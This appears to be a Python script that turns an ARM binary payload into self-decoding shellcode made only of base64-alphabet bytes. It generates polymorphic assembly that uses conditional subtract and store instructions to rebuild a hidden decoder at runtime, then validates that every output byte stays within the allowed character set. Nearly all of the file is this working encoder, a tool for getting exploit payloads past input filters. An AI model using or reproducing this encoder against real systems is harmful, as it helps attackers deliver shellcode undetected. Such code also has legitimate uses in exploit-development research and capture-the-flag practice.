import os, random, string, binascii, re, base64

def randChar():
	return random.choice(string.ascii_uppercase+string.ascii_lowercase+string.digits+"+/=").encode("ascii")

def randByte():
	return "0x"+binascii.hexlify(randChar()).decode()

def isValid(byte):
	return chr(int(byte,16)) in string.ascii_uppercase+string.ascii_lowercase+string.digits+"+/="

def randInstruction():
	result = ".byte "
	result+=randByte()+", "
	result+="0x"+str(random.choice(range(3,8)))+str(random.choice(range(1,10)))+", "
	result+="0x"+str(random.choice(range(3,8)))+str(random.choice(range(1,10)))+", "
	result+="0x"+str(random.choice(range(4,6)))+"2\n"
	return result

decoderBytes = ["02", "00", "9F", "4F", "16", "FF", "2F", "E1",
"36", "A1", "2A", "A2", "0F", "F2", "4D", "03", "98", "47", "4F", "EA", "80", "04", "0F", "F2",
"45", "03", "98", "47", "4F", "EA", "10", "16", "44", "EA", "06", "04", "0F", "F2", "85", "03",
"98", "47", "4F", "EA", "00", "14", "0F", "F2", "2D", "03", "98", "47", "4F", "EA", "90", "06",
"44", "EA", "06", "04", "0F", "F2", "6D", "03", "98", "47", "4F", "EA", "80", "14", "0F", "F2",
"15", "03", "98", "47", "44", "EA", "00", "04", "0F", "F2", "59", "03", "98", "47", "AF", "F2",
"4B", "03", "18", "47", "08", "78", "3D", "28", "04", "BF", "14", "A3", "18", "47", "01", "F1",
"01", "01", "41", "28", "A0", "F1", "41", "00", "BC", "BF", "0F", "F2", "17", "03", "18", "47",
"36", "46", "19", "28", "DC", "BF", "0F", "F2", "09", "03", "18", "47", "A0", "F1", "06", "00",
"F7", "46", "00", "F1", "11", "00", "00", "28", "BC", "BF", "0F", "F2", "0B", "03", "18", "47",
"00", "F1", "34", "00", "F7", "46", "C0", "F1", "00", "00", "4F", "EA", "90", "00", "C0", "F1",
"3F", "00", "F7", "46", "14", "70", "02", "F1", "01", "02", "F7", "46"]


byteTable = {}

offsetTable = {
	"199":["7a"]*3+["64","2b"],
	"1ED":["7a"]*4+["69"],
	"2FB":["7a"]*6+["42","41"],
	"421":["7a"]*8+["74","41"],
	"573":["7a"]*11+["6e","2b"],
	"6C9":["7a"]*14+["56","2b"],
	"813":["7a"]*16+["76","61"],
	"909":["7a"]*18+["78","61"],
}

def check(key,value):
	v = 0x64
	for i in value:
		v-=int(i,16)
	if(v!=-int(key,16)):
		print("Error with "+key)

def calculate(v):
	value = int(v,16)
	value+=0x64
	count = int(value/0x7a)
	value-=0x7a*count
	result = []
	if value<0x2b:
		count-=1
		value+=0x7a
	if isValid("%0.2X"%value):
		result.append("%0.2X"%value)
	else:
		value-=0x4d
		result.append("4d")
		if value<0x2b:
			result=result[:-1]
			value+=0x4d
			value-=0x2b
			result.append("2b")
		if isValid("%0.2X"%value):
			result.append("%0.2X"%value)
		else:
			if value>0x39 and value<0x41:
				count-=1
				value+=0x7a
				value-=0x4b
				result.append("4b")
				if isValid("%0.2X"%value):
					result.append("%0.2X"%value)
				else:
					print("Invalid 1 0x%0.2X"%value)
					exit()
			elif value<0x2b:
				count-=1
				value+=0x7a
				value-=0x2b
				result.append("2b")
				if isValid("%0.2X"%value):
					result.append("%0.2X"%value)
				else:
					if value>0x5a and value<0x61:
						value-=0x2b				
						result.append("2b")
						result.append("%0.2X"%value)	
					else:
						print("Invalid 2 0x%0.2X"%value)
						exit()
			else:
				print("Invalid 3 0x%0.2X"%value)
				exit()				
	result=["7a"]*count+result
	check(v,result)
	return result

def validateTable():
	for key in byteTable:
		v = 0x64
		for i in byteTable[key]:
			v-=int(i,16)
			if v<0:
				v+=0x100
		if(v!=int(key,16)):
			print("Error with "+key)

def createTable():
	for i in range(0x00,0x04):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x04,0x0a):
		byteTable["%0.2X"%i]=["7a","7a","%0.2X"%(0x70-i)]
	for i in range(0x0a,0x24):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x24,0x30):
		byteTable["%0.2X"%i]=["7a","5a","%0.2X"%(0x90-i)]
	for i in range(0x2b,0x35):
		byteTable["%0.2X"%i]=["%0.2X"%(0x64-i)]
	for i in range(0x35,0x37):
		byteTable["%0.2X"%i]=["7a","61","%0.2X"%(0x89-i)]
	for i in range(0x37,0x41):
		byteTable["%0.2X"%i]=["7a","7a","%0.2X"%(0x70-i)]
	for i in range(0x41,0x45):
		byteTable["%0.2X"%i]=["7a","61","%0.2X"%(0x89-i)]
	for i in range(0x45,0x5f):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]
	for i in range(0x65,0x70):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]	
	for i in range(0x70,0x8a):
		byteTable["%0.2X"%i]=["7a","%0.2X"%(0xea-i)]
	for i in range(0x86,0x90):
		byteTable["%0.2X"%i]=["7a","2b","%0.2X"%(0xbf-i)]
	for i in range(0x90,0xaa):
		byteTable["%0.2X"%i]=["7a","%0.2X"%(0xea-i)]
	for i in range(0xaa,0xb0):
		byteTable["%0.2X"%i]=["61","%0.2X"%(0x103-i)]
	for i in range(0xb0,0xca):
		byteTable["%0.2X"%i]=["5a","%0.2X"%(0x10a-i)]
	for i in range(0xca,0xd8):
		byteTable["%0.2X"%i]=["2b","%0.2X"%(0x139-i)]
	for i in range(0xda,0xea):
		byteTable["%0.2X"%i]=["30","%0.2X"%(0x134-i)]
	for i in range(0xea,0x100):
		byteTable["%0.2X"%i]=["%0.2X"%(0x164-i)]
	validateTable()

def polymorphRange(bytesData):
	string = []
	bytes= bytesData[::-1]
	for i in range(0,len(bytes),26):
		byteSection=bytes[i:i+26]
		offset=0x41
		section = []
		for byte in byteSection:			
			if not isValid(byte):			
				section+=polymorph(byte,str(offset))
			offset+=1
		string=section+string
		section=[]
		for i,v in enumerate(calculate("%0.2X"%(len(string)*4+len(bytes)-i+0x41+7))):
			section.append("\tsubpl r5, "+("r7" if i==0 else "r5")+", #0x"+v)
		section.append("\tsubpl r3, r7, #0x64")
		section.append("\tsubpl r4, pc, r5, ror r3")
		string=section+string
	return "\n".join(string)
		

def polymorph(value, offset):
	string = []
	for i,v in enumerate(byteTable[value]):
		string.append("\tsubpl r3, "+("r7" if i==0 else "r3")+", #0x"+v)
	string.append("\tstrbpl r3, [r4, #-"+offset+"]")
	return string

createTable()

payload = ""
os.system("arm-linux-gnueabihf-as -o payload.o payload.s")
os.system("arm-linux-gnueabihf-objcopy --dump-section .text=payload.bin payload.o")
with open("payload.bin","rb") as f:
	payload=base64.b64encode(f.read()).replace(b"=",b"A")

data = """.syntax unified
.text
.global _start
_start:
	.ARM
	.byte 0x64, 0x45, 0x36, 0x42
"""

for _ in range(23):
	data+="\t"+randInstruction()

data +="""
	subpl r3, pc, #48
	submi r3, pc, #52
	ldrbpl r7, [r3, #-0x38]
	ldrbmi r7, [r3, #-0x38]
	subspl r3, r7, #0x64
	subsmi r3, r7, #0x64

"""

data+=polymorphRange(decoderBytes)

data+="""
	subpl r5, r7, #0x64
	subpl r3, r7, #0x69
	subpl r6, pc, r3, ror r5
"""

data+=".byte 0x"+", 0x".join([byte if isValid(byte) else "%0.2X"%ord(randChar()) for byte in decoderBytes])

data+="""
output: .space """+str(int(len(payload)*0.75))+""", 0x31
input: .ascii \""""+payload.decode()+"="+randChar().decode()*(4-((len(payload)+int(len(payload)*0.75)+1)%4))+"""\"
"""

with open("arm.s","wb+") as f:
	f.write(data.encode("ascii"))

os.system("arm-linux-gnueabihf-as -W -o arm.o arm.s")
os.system("arm-linux-gnueabihf-ld -N -o arm arm.o")
os.system("arm-linux-gnueabihf-objcopy --dump-section .text=arm.bin arm.o")
with open("arm.bin","r",encoding="ISO-8859-1") as f:
	valid = True
	for char in f.read():
		if not isValid("%0.2X"%ord(char)):
			print("INVALID ASSEMBLY: %0.2X"%ord(char))
			valid=False
	if valid:
		print("Base64 Assembly Generated")
